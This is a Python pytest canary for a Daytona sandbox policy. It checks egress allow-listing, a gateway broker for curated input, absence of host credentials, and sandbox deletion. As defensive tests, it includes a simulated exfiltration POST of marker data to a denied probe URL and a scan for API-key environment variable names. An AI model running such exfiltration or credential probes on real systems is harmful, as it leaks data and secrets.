"""Opt-in behavioral proof for the strict Daytona optimization policy.

This non-LLM/non-GEPA canary uses literal synthetic input.  Its probe
controller is host-only: the sandbox receives disposable HTTPS probe URLs but
never the controller URL or its credential.
"""

from __future__ import annotations

import asyncio
import json
import os
import re
from collections.abc import Callable
from dataclasses import dataclass
from typing import cast
from urllib.parse import urljoin, urlparse
from urllib.request import Request, urlopen

import pytest

from fleet_rlm.config import load_runtime_settings
from fleet_rlm.daytona.interpreter import DaytonaCodeInterpreter, sandbox_backend
from fleet_rlm.daytona.optimization_evaluator import (
    DisposableOptimizationSandboxFactory,
    OptimizationSandboxPolicy,
)
from fleet_rlm.daytona.platform import LiveDaytonaPlatform, build_daytona_client
from fleet_rlm.daytona.provisioning import DaytonaSandboxSpec
from fleet_rlm.optimization.curated_input import CuratedEvaluationStore
from fleet_rlm.optimization.evidence import (
    DevelopmentDaytonaCanaryReport,
    EvidenceStore,
    write_development_daytona_canary_report,
)
from fleet_rlm.optimization.types import OptimizationRecord
from fleet_rlm.rlm.dspy_interpreter_contract import is_final_output

_LIVE_VALUES = frozenset({"1", "true", "yes"})
_PROBE_TIMEOUT_SECONDS = 20
_OBSERVATION_WINDOW_SECONDS = 2
_DELETE_POLL_ATTEMPTS = 20
_DELETE_POLL_INTERVAL_SECONDS = 0.5
_PROBE_ID = re.compile(r"^[A-Za-z0-9_-]{16,128}$")


def _live_value(name: str) -> str:
    """
    Retrieve a required non-empty environment variable value.
    
    Parameters:
    	name (str): Name of the environment variable.
    
    Returns:
    	str: The trimmed environment variable value.
    
    """
    value = os.environ.get(name, "").strip()
    if not value:
        pytest.skip(f"{name} is required")
    return value


def _https_url(value: str, *, label: str) -> str:
    """
    Validate and return an HTTPS URL without credentials, query parameters, or fragments.
    
    Parameters:
        value (str): URL to validate.
        label (str): Label used in the validation failure message.
    
    Returns:
        str: The validated URL.
    """
    parsed = urlparse(value)
    if (
        parsed.scheme != "https"
        or not parsed.hostname
        or parsed.username
        or parsed.password
        or parsed.query
        or parsed.fragment
    ):
        pytest.fail(f"{label} must be an HTTPS URL without credentials, query, or fragment")
    return value


def _bare_domain(value: str, *, label: str) -> str:
    """
    Validate and normalize a bare DNS host name.
    
    Parameters:
        value (str): Host name to validate.
        label (str): Name used in the validation failure message.
    
    Returns:
        str: The normalized lowercase host name.
    """
    domain = value.strip().lower()
    if not re.fullmatch(r"(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}", domain):
        pytest.fail(f"{label} must be a bare DNS host name")
    return domain


def _loopback_controller_url(value: str) -> str:
    """
    Validate and return a loopback HTTP probe-controller URL.
    
    Parameters:
    	value (str): The URL to validate.
    
    Returns:
    	str: The original URL when it uses HTTP, targets a loopback host, and contains no credentials, path, query, or fragment.
    """
    parsed = urlparse(value)
    if (
        parsed.scheme != "http"
        or parsed.hostname not in {"127.0.0.1", "::1", "localhost"}
        or parsed.username
        or parsed.password
        or parsed.path not in {"", "/"}
        or parsed.query
        or parsed.fragment
    ):
        pytest.fail("FLEET_OPTIMIZATION_PROBE_CONTROLLER_URL must be loopback HTTP")
    return value


def _sandbox_value(sandbox: object, name: str) -> object:
    """Retrieve a named value from a sandbox mapping or object attribute.
    
    Parameters:
    	sandbox (object): The sandbox mapping or object to inspect.
    	name (str): The value name to retrieve.
    
    Returns:
    	object: The value associated with the name, or `None` if it is unavailable.
    """
    if isinstance(sandbox, dict):
        return sandbox.get(name)
    return getattr(sandbox, name, None)


@dataclass(frozen=True, slots=True)
class _Probe:
    probe_id: str
    allowed_url: str
    redirect_url: str
    denied_url: str
    allowed_domain: str
    denied_domain: str


@dataclass(frozen=True, slots=True)
class _GatewayBroker:
    broker_id: str
    secret: str
    url: str


class _ProbeController:
    """Host-side protocol for a controlled pair of HTTPS probe origins."""

    def __init__(self) -> None:
        """Initialize the probe controller with its loopback URL and authentication token."""
        controller_url = _loopback_controller_url(_live_value("FLEET_OPTIMIZATION_PROBE_CONTROLLER_URL"))
        self._base_url = controller_url.rstrip("/") + "/"
        self._token = _live_value("FLEET_OPTIMIZATION_PROBE_CONTROLLER_TOKEN")

    async def create_probe(self) -> _Probe:
        """
        Create and validate controlled probe origins for the canary test.
        
        Returns:
        	_Probe: Validated probe identifiers, URLs, and domains for allowed, redirected, and denied requests.
        """
        payload = await asyncio.to_thread(
            self._request,
            "POST",
            "v1/probes",
            {"schema": "fleet.strict-daytona-canary/v1"},
        )
        if payload.get("allowed_healthy") is not True or payload.get("denied_healthy") is not True:
            pytest.fail("probe controller did not preflight both controlled origins")
        probe_id = payload.get("probe_id")
        if not isinstance(probe_id, str) or not _PROBE_ID.fullmatch(probe_id):
            pytest.fail("probe controller returned an invalid probe identifier")
        allowed_url = _https_url(str(payload.get("allowed_url") or ""), label="controller allowed_url")
        redirect_url = _https_url(str(payload.get("redirect_url") or ""), label="controller redirect_url")
        denied_url = _https_url(str(payload.get("denied_url") or ""), label="controller denied_url")
        allowed_domain = _bare_domain(str(payload.get("allowed_domain") or ""), label="controller allowed_domain")
        denied_domain = _bare_domain(str(payload.get("denied_domain") or ""), label="controller denied_domain")
        if urlparse(allowed_url).hostname != allowed_domain:
            pytest.fail("controller allowed origin does not match its approved domain")
        if urlparse(redirect_url).hostname != allowed_domain:
            pytest.fail("controller redirect origin does not match the approved gateway domain")
        if denied_domain == allowed_domain or urlparse(denied_url).hostname != denied_domain:
            pytest.fail("controller denied origin must use a distinct domain")
        return _Probe(
            probe_id=probe_id,
            allowed_url=allowed_url,
            redirect_url=redirect_url,
            denied_url=denied_url,
            allowed_domain=allowed_domain,
            denied_domain=denied_domain,
        )

    async def observations(self, probe: _Probe) -> dict[str, object]:
        """Retrieve observations recorded for a controlled probe.
        
        Parameters:
        	probe (_Probe): The probe whose observations to retrieve.
        
        Returns:
        	dict[str, object]: The probe's recorded observations.
        """
        return await asyncio.to_thread(self._request, "GET", f"v1/probes/{probe.probe_id}", None)

    async def create_gateway_broker(self, probe: _Probe) -> _GatewayBroker:
        """
        Create and validate a gateway broker for the allowed probe domain.
        
        Parameters:
        	probe (_Probe): Probe configuration whose allowed domain must match the broker URL.
        
        Returns:
        	_GatewayBroker: Validated gateway broker credentials and URL.
        """
        payload = await asyncio.to_thread(self._request, "POST", "v1/brokers", {"schema": "v1"})
        broker_id = payload.get("broker_id")
        secret = payload.get("broker_secret")
        url = _https_url(str(payload.get("broker_url") or ""), label="controller broker_url")
        if (
            not isinstance(broker_id, str)
            or not _PROBE_ID.fullmatch(broker_id)
            or not isinstance(secret, str)
            or len(secret) < 32
            or urlparse(url).hostname != probe.allowed_domain
        ):
            pytest.fail("probe controller returned an invalid gateway broker")
        return _GatewayBroker(broker_id=broker_id, secret=secret, url=url)

    async def pending_gateway_calls(self, broker: _GatewayBroker) -> list[dict[str, object]]:
        """
        Retrieve pending requests for a gateway broker.
        
        Parameters:
        	broker (_GatewayBroker): The broker whose pending requests should be retrieved.
        
        Returns:
        	list[dict[str, object]]: The broker's pending requests.
        """
        payload = await asyncio.to_thread(self._request, "GET", f"v1/brokers/{broker.broker_id}/pending", None)
        requests = payload.get("requests")
        if not isinstance(requests, list) or not all(isinstance(item, dict) for item in requests):
            pytest.fail("probe controller returned invalid broker requests")
        return [cast(dict[str, object], item) for item in requests]

    async def submit_gateway_result(
        self, broker: _GatewayBroker, payload: dict[str, object]
    ) -> None:
        """Submit a gateway broker result payload to the probe controller."""
        await asyncio.to_thread(self._request, "POST", f"v1/brokers/{broker.broker_id}/result", payload)

    def _request(self, method: str, path: str, payload: dict[str, object] | None) -> dict[str, object]:
        """
        Send an authenticated JSON request to the probe controller.
        
        Parameters:
        	method (str): HTTP method to use.
        	path (str): Controller-relative request path.
        	payload (dict[str, object] | None): JSON object to send, or `None` when no request body is needed.
        
        Returns:
        	dict[str, object]: The controller's JSON object response.
        """
        body = json.dumps(payload).encode() if payload is not None else None
        request = Request(
            urljoin(self._base_url, path),
            data=body,
            method=method,
            headers={
                "Accept": "application/json",
                "Authorization": f"Bearer {self._token}",
                **({"Content-Type": "application/json"} if body is not None else {}),
            },
        )
        try:
            with urlopen(request, timeout=_PROBE_TIMEOUT_SECONDS) as response:
                if not 200 <= response.status < 300:
                    pytest.fail("probe controller returned a non-success response")
                result = json.loads(response.read().decode("utf-8"))
        except Exception as exc:
            pytest.fail(f"probe controller request failed: {type(exc).__name__}")
        if not isinstance(result, dict):
            pytest.fail("probe controller returned a non-object response")
        return result


def _record() -> OptimizationRecord:
    """
    Build the fixed synthetic optimization record used by the policy canary.
    
    Returns:
    	OptimizationRecord: The synthetic record with its expected marker, output contract, provenance, and content digest.
    """
    return OptimizationRecord(
        record_id="synthetic-policy-canary",
        query="Return the literal synthetic marker.",
        output_contract={"answer": "string"},
        expectations={"marker": "synthetic"},
        execution_requirements={},
        provenance={"redaction_version": "synthetic-v1"},
        content_sha256="a" * 64,
    )


async def _execute(interpreter: DaytonaCodeInterpreter, code: str, variables: dict[str, object]) -> object:
    """Execute interpreter code in a worker thread and return its result."""
    return await asyncio.to_thread(interpreter.execute, code, variables)


def _gateway_broker_source(broker: _GatewayBroker) -> str:
    """
    Generate sandbox source exposing the mediated curated-input capability.
    
    Parameters:
        broker (_GatewayBroker): Gateway endpoint and authentication details embedded in the generated source.
    
    Returns:
        str: Python source code for the sandbox-visible broker function.
    """
    return (
        "import json as _json\n"
        "import urllib.request as _urllib_request\n\n"
        "def read_curated_input(transaction_id, sha256, json_pointer='', start=0, limit=8000):\n"
        "    _payload = _json.dumps({\n"
        "        'tool_name': 'read_curated_input',\n"
        "        'args': [],\n"
        "        'kwargs': {\n"
        "            'transaction_id': transaction_id,\n"
        "            'sha256': sha256,\n"
        "            'json_pointer': json_pointer,\n"
        "            'start': start,\n"
        "            'limit': limit,\n"
        "        },\n"
        "    }).encode('utf-8')\n"
        f"    _request = _urllib_request.Request({broker.url!r}, data=_payload, method='POST', headers={{\n"
        "        'Content-Type': 'application/json',\n"
        f"        'X-Broker-Secret': {broker.secret!r},\n"
        "        'User-Agent': 'Fleet-Daytona-development-probe/1',\n"
        "    })\n"
        "    with _urllib_request.urlopen(_request, timeout=30) as _response:\n"
        "        _reply = _json.loads(_response.read().decode('utf-8'))\n"
        "    if 'error' in _reply:\n"
        "        raise RuntimeError('gateway broker rejected tool call')\n"
        "    return _reply['result']\n"
    )


async def _execute_gateway_broker(
    interpreter: DaytonaCodeInterpreter,
    controller: _ProbeController,
    broker: _GatewayBroker,
    reader: Callable[..., object],
    code: str,
    variables: dict[str, object],
) -> object:
    """
    Execute untrusted code while mediating its curated-input requests through the gateway broker.
    
    Parameters:
        reader (Callable[..., object]): Function used to resolve authorized curated-input requests.
        code (str): Untrusted code to execute.
        variables (dict[str, object]): Variables made available to the executed code.
    
    Returns:
        object: The result produced by the executed code.
    """
    task = asyncio.create_task(_execute(interpreter, _gateway_broker_source(broker) + "\n" + code, variables))
    while not task.done():
        for call in await controller.pending_gateway_calls(broker):
            call_id = call.get("id")
            lease_token = call.get("lease_token")
            args = call.get("args")
            kwargs = call.get("kwargs")
            if (
                call.get("tool_name") != "read_curated_input"
                or not isinstance(call_id, str)
                or not isinstance(lease_token, str)
                or not isinstance(args, list)
                or not isinstance(kwargs, dict)
            ):
                pytest.fail("gateway broker request violated the narrow broker contract")
            try:
                result = reader(*cast(list[object], args), **cast(dict[str, object], kwargs))
                response: dict[str, object] = {"id": call_id, "lease_token": lease_token, "result": result}
            except Exception:
                response = {"id": call_id, "lease_token": lease_token, "error": "broker denied tool call"}
            await controller.submit_gateway_result(broker, response)
        await asyncio.sleep(0.05)
    return await task


def _answer(result: object) -> str:
    """
    Extract the validated answer from an interpreter or broker response.
    
    Parameters:
        result (object): The response to validate and extract.
    
    Returns:
        str: The response's string value under the ``answer`` key.
    
    """
    if is_final_output(result):
        result = getattr(result, "output", None)
    if not isinstance(result, dict):
        pytest.fail("strict policy canary did not receive a typed broker/interpreter response")
    typed_result = cast(dict[str, object], result)
    answer = typed_result.get("answer")
    if set(typed_result) != {"answer"} or not isinstance(answer, str):
        pytest.fail("strict policy canary did not receive a typed broker/interpreter response")
    return answer


def _assert_observations(observations: dict[str, object]) -> None:
    """Validate that probe observations match the expected allowed, redirected, and blocked request counts."""
    if observations.get("allowed_requests") != 1:
        pytest.fail("probe controller did not observe exactly one allowed gateway request")
    if observations.get("redirect_requests") != 1:
        pytest.fail("probe controller did not observe the allowed-to-denied redirect request")
    if observations.get("denied_requests") != 0:
        pytest.fail("probe controller observed a blocked egress request")


async def _confirm_deleted(platform: LiveDaytonaPlatform, sandbox_id: str) -> None:
    """
    Confirm that the specified Daytona sandbox has been deleted.
    
    Parameters:
        platform (LiveDaytonaPlatform): Daytona platform used to query the sandbox.
        sandbox_id (str): Identifier of the sandbox to verify.
    
    Raises:
        AssertionError: If the sandbox still exists after all deletion checks.
    """
    for attempt in range(_DELETE_POLL_ATTEMPTS):
        if await platform.get(sandbox_id) is None:
            return
        if attempt + 1 < _DELETE_POLL_ATTEMPTS:
            await asyncio.sleep(_DELETE_POLL_INTERVAL_SECONDS)
    raise AssertionError("Daytona did not confirm evaluator sandbox deletion")


@pytest.mark.live_daytona
@pytest.mark.asyncio
@pytest.mark.timeout(180)
async def test_safe_optimizer_strict_daytona_policy_canary(tmp_path) -> None:
    """Live-prove broker capability, egress policy, external non-delivery, and deletion."""
    if os.environ.get("FLEET_LIVE", "").strip().lower() not in _LIVE_VALUES:
        pytest.skip("FLEET_LIVE=1 is required")
    if os.environ.get("RUN_LIVE_DAYTONA_STRICT_SMOKE", "").strip().lower() not in _LIVE_VALUES:
        pytest.skip("RUN_LIVE_DAYTONA_STRICT_SMOKE=1 is required")

    controller = _ProbeController()
    probe = await controller.create_probe()
    gateway_domain = probe.allowed_domain
    settings = load_runtime_settings()
    spec = DaytonaSandboxSpec.from_settings(settings)
    policy = OptimizationSandboxPolicy(
        snapshot=spec.snapshot,
        gateway_domains=(gateway_domain,),
        auto_stop_interval_seconds=300,
        auto_delete_interval_seconds=0,
    )
    platform = LiveDaytonaPlatform(build_daytona_client(settings), spec)
    factory = DisposableOptimizationSandboxFactory(platform=platform, sandbox_spec=spec)
    store = CuratedEvaluationStore(candidate="synthetic-policy-canary-marker", record=_record())
    handle = store.handle.public_value()
    sandbox = None
    sandbox_id = ""
    interpreter: DaytonaCodeInterpreter | None = None
    cleanup = {"interpreter": False, "broker": False, "sandbox": False}
    passed = {
        "broker_started": False,
        "broker_round_trip": False,
        "valid_capability_read": False,
        "invalid_transaction_denied": False,
        "invalid_digest_denied": False,
        "direct_egress_denied": False,
        "denied_egress_unobserved": False,
        "effective_policy_verified": False,
        "host_credentials_absent": False,
        "approved_gateway_egress": False,
    }
    primary_error: BaseException | None = None
    try:
        sandbox = await factory.create(
            policy=policy,
            run_id="strict-policy-canary",
            candidate_sha256="b" * 64,
            record_id="synthetic-policy-canary",
        )
        sandbox_id = str(_sandbox_value(sandbox, "id") or "")
        assert sandbox_id
        effective_sandbox = await platform.get(sandbox_id)
        assert effective_sandbox is not None
        # The current Daytona response model omits ``ephemeral``.  The factory
        # contract proves that creation requested it, while a zero effective
        # auto-delete interval avoids sending a contradictory TTL request.
        assert policy.auto_delete_interval_seconds == 0
        assert _sandbox_value(effective_sandbox, "volumes") in (None, [])
        assert _sandbox_value(effective_sandbox, "domain_allow_list") == gateway_domain
        assert _sandbox_value(effective_sandbox, "network_allow_list") in (None, "")
        assert _sandbox_value(effective_sandbox, "network_block_all") is False
        passed["effective_policy_verified"] = True

        interpreter = DaytonaCodeInterpreter(
            backend=sandbox_backend(sandbox, loop=asyncio.get_running_loop(), timeout_s=_PROBE_TIMEOUT_SECONDS),
            tools={},
            output_fields=[{"name": "answer", "type": "str"}],
        )
        gateway_broker = await controller.create_gateway_broker(probe)
        reader = store.broker_tool(handle=store.handle)
        valid = await _execute_gateway_broker(
            interpreter,
            controller,
            gateway_broker,
            reader,
            "read_curated_input(\n"
            "    transaction_id=curated_input_handle['transaction_id'],\n"
            "    sha256=curated_input_handle['sha256'],\n"
            "    json_pointer='/record/record_id',\n"
            ")\n"
            "SUBMIT(answer='valid')",
            {"curated_input_handle": handle},
        )
        assert _answer(valid) == "valid"
        passed["broker_started"] = True
        passed["broker_round_trip"] = True
        passed["valid_capability_read"] = True

        credentials = await _execute(
            interpreter,
            "import os\n"
            "sensitive_names = {\n"
            "    'DAYTONA_API_KEY', 'FLEET_DAYTONA_API_KEY', 'DATABRICKS_TOKEN',\n"
            "    'OPENAI_API_KEY', 'ANTHROPIC_API_KEY', 'GOOGLE_API_KEY',\n"
            "}\n"
            "present = sorted(sensitive_names.intersection(os.environ))\n"
            "SUBMIT(answer='clean' if not present else ','.join(present))",
            {},
        )
        assert _answer(credentials) == "clean"
        passed["host_credentials_absent"] = True

        invalid_transaction = dict(handle)
        invalid_transaction["transaction_id"] = "invalid"
        transaction_result = await _execute_gateway_broker(
            interpreter,
            controller,
            gateway_broker,
            reader,
            "try:\n"
            "    read_curated_input(\n"
            "        transaction_id=curated_input_handle['transaction_id'],\n"
            "        sha256=curated_input_handle['sha256'],\n"
            "    )\n"
            "except Exception:\n"
            "    SUBMIT(answer='denied')\n"
            "else:\n"
            "    SUBMIT(answer='unexpected')",
            {"curated_input_handle": invalid_transaction},
        )
        assert _answer(transaction_result) == "denied"
        passed["invalid_transaction_denied"] = True

        invalid_digest = dict(handle)
        invalid_digest["sha256"] = "0" * 64
        digest_result = await _execute_gateway_broker(
            interpreter,
            controller,
            gateway_broker,
            reader,
            "try:\n"
            "    read_curated_input(\n"
            "        transaction_id=curated_input_handle['transaction_id'],\n"
            "        sha256=curated_input_handle['sha256'],\n"
            "    )\n"
            "except Exception:\n"
            "    SUBMIT(answer='denied')\n"
            "else:\n"
            "    SUBMIT(answer='unexpected')",
            {"curated_input_handle": invalid_digest},
        )
        assert _answer(digest_result) == "denied"
        passed["invalid_digest_denied"] = True

        allowed = await _execute(
            interpreter,
            "import urllib.request\n"
            "request = urllib.request.Request(\n"
            "    allowed_url, headers={'User-Agent': 'Fleet-Daytona-development-probe/1'}\n"
            ")\n"
            "response = urllib.request.urlopen(request, timeout=3)\n"
            "SUBMIT(answer='allowed' if 200 <= response.status < 300 else 'denied')",
            {"allowed_url": probe.allowed_url},
        )
        assert _answer(allowed) == "allowed"
        passed["approved_gateway_egress"] = True

        redirected = await _execute(
            interpreter,
            "import urllib.request\n"
            "try:\n"
            "    request = urllib.request.Request(\n"
            "        redirect_url, headers={'User-Agent': 'Fleet-Daytona-development-probe/1'}\n"
            "    )\n"
            "    urllib.request.urlopen(request, timeout=3).read(1)\n"
            "    SUBMIT(answer='allowed')\n"
            "except Exception:\n"
            "    SUBMIT(answer='blocked')",
            {"redirect_url": probe.redirect_url},
        )
        assert _answer(redirected) == "blocked"

        denied = await _execute(
            interpreter,
            "import urllib.request\n"
            "try:\n"
            "    request = urllib.request.Request(\n"
            "        denied_url, headers={'User-Agent': 'Fleet-Daytona-development-probe/1'}\n"
            "    )\n"
            "    urllib.request.urlopen(request, timeout=3).read(1)\n"
            "    SUBMIT(answer='allowed')\n"
            "except Exception:\n"
            "    SUBMIT(answer='blocked')",
            {"denied_url": probe.denied_url},
        )
        assert _answer(denied) == "blocked"

        exfiltration = await _execute_gateway_broker(
            interpreter,
            controller,
            gateway_broker,
            reader,
            "import urllib.request\n"
            "marker = read_curated_input(\n"
            "    transaction_id=curated_input_handle['transaction_id'],\n"
            "    sha256=curated_input_handle['sha256'],\n"
            "    json_pointer='/candidate',\n"
            ')["json"]\n'
            "request = urllib.request.Request(\n"
            "    denied_url,\n"
            "    data=marker.encode(),\n"
            "    method='POST',\n"
            "    headers={'User-Agent': 'Fleet-Daytona-development-probe/1'},\n"
            ")\n"
            "try:\n"
            "    urllib.request.urlopen(request, timeout=3).read(1)\n"
            "    SUBMIT(answer='allowed')\n"
            "except Exception:\n"
            "    SUBMIT(answer='blocked')",
            {"curated_input_handle": handle, "denied_url": probe.denied_url},
        )
        assert _answer(exfiltration) == "blocked"

        passed["direct_egress_denied"] = True

        await asyncio.sleep(_OBSERVATION_WINDOW_SECONDS)
        _assert_observations(await controller.observations(probe))
        passed["denied_egress_unobserved"] = True
    except BaseException as exc:
        primary_error = exc
        raise
    finally:
        cleanup_error: BaseException | None = None
        if interpreter is not None:
            try:
                await asyncio.to_thread(interpreter.shutdown, strict_broker_cleanup=True)
                cleanup["interpreter"] = True
                cleanup["broker"] = True
            except BaseException as exc:
                cleanup_error = exc
        try:
            store.consume()
        except BaseException as exc:
            cleanup_error = cleanup_error or exc
        if sandbox is not None:
            try:
                await asyncio.shield(factory.delete(sandbox))
                await _confirm_deleted(platform, sandbox_id)
                cleanup["sandbox"] = True
            except BaseException as exc:
                cleanup_error = cleanup_error or exc
        if cleanup_error is not None:
            # Mirror the production _cleanup precedence: never let a cleanup
            # failure mask the primary probe failure; chain it as a note.
            if primary_error is None:
                raise cleanup_error
            primary_error.add_note(f"cleanup also failed: {cleanup_error!r}")

    assert all(value is True for value in cleanup.values())
    report = DevelopmentDaytonaCanaryReport(
        policy_id=policy.policy_id,
        snapshot=policy.snapshot,
        controls={
            "no_volume_requested": True,
            "ephemeral_requested": True,
            "domain_allow_list_requested": True,
            "auto_stop_seconds": policy.auto_stop_interval_seconds,
            "auto_delete_seconds": policy.auto_delete_interval_seconds,
        },
        outcomes={
            **{key: "passed" if value else "failed" for key, value in passed.items()},
            "interpreter_cleanup": "passed",
            "broker_cleanup": "passed",
            "sandbox_deleted": "passed",
        },
    )
    evidence = EvidenceStore(tmp_path, "strict-policy-canary")
    evidence.initialize({"schema": "fleet.daytona-development-canary/v1"})
    write_development_daytona_canary_report(evidence, report)
    assert (evidence.root / "daytona-development-canary.json").exists()
